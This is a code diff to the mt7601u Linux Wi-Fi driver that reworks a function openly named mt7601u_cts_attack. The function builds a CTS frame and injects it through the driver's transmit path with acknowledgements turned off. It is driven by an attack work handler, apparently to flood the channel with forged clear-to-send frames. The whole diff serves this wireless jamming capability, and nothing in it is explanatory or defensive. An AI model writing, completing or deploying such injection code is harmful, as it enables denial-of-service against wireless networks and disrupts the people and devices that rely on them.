@@ -1,6 +1,7 @@
 #include <linux/skbuff.h>
 #include <linux/timer.h>
 #include <linux/kernel.h>
+#include <linux/ieee80211.h>
 #include "mt7601u.h"
 
 static const u8 CTS_Frame[] = {
@@ -11,15 +12,19 @@ static const u8 CTS_Frame[] = {
 
 static void mt7601u_cts_attack(struct mt7601u_dev *dev){
     struct sk_buff *skb;
-    struct mt76_wcid *wcid = dev->mon_wcid;
+    struct ieee80211_tx_info *info;
+    struct ieee80211_tx_control control = {0};
 
     skb = dev_alloc_skb(sizeof(CTS_Frame));
     if(!skb)    
         return;
 
     skb_put_data(skb, CTS_Frame, sizeof(CTS_Frame));
-    mt7601u_push_txwi(dev, skb, NULL, wcid, sizeof(CTS_Frame));
-    mt7601u_dma_enqueue_tx(dev, skb, wcid, 0);
+    info = IEEE80211_SKB_CB(skb);
+    memset(info, 0, sizeof(*info));
+    info->flags |= IEEE80211_TX_CTL_NO_ACK;
+    skb_set_queue_mapping(skb, 0);
+    mt7601u_tx(dev->hw, &control, skb);
 }
 
 static void mt7601u_attack_work_handler(struct work_struct *work){
